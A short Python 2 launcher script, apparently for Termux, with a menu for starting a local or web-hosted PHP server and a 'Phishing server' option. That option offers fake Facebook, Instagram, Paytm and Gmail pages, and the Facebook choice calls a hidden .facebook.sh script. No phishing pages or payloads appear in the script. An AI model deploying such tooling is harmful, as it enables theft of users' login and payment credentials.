#!/bin/env python2
import os
while 1:
	os.system("clear")
	print "\033[1;39m                 ============================"
	print "                 |      SERVER     PHP      |"
	print "                 |    Only    for    termux |"
	print "                 ============================"
	print ""
	print "                 1 - Localhost"
	print "                 2 - Webhost"
	print "                 3 - Phishing server"
	print ""
	print "                 99 - exit"
	print ""
	x = raw_input("\033[1;39m 		Select option :- ")
	if x == "1":
		os.system("clear")
		os.system("sh .localhost.sh")
	elif x=="2":
		os.system("clear")
		os.system("sh .webhost.sh")
	elif x == "3":
		while 1:
		  try:
			os.system("clear")
			os.system("figlet +Phishing+")
			print '    ============================='
			print "          1 - Facebook page"
			print "          2 - Instagram page"
			print "          3 - Paytm"
			print "          4 - Gmail"
			print ""
			print "          99 - back menue"
			print "    ============================="
			print ""
			y = raw_input("Select your option :- ")
			if y == "1":
				os.system("sh .facebook.sh")
			elif y== "99":
				break
		  except KeyboardInterrupt:
			print ""
			print "Exiting ...."
			os.system("sleep 2")
	elif x == "99":
		os.system("clear")
		break
